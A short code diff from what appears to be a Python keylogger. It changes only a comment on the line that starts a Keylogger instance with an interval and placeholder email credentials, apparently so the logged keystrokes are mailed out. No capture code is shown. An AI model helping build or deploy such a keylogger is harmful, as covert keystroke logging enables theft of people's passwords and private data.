@@ -72,7 +72,7 @@ class Keylogger:
 PROGRAM STARTS HERE
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 
-my_keylogger = Keylogger(20, "email@example.com", "passw0rd")   #Add the time interval.
+my_keylogger = Keylogger(20, "email@example.com", "passw0rd")   #Add the time interval and email and password.
 my_keylogger.start()
 
 
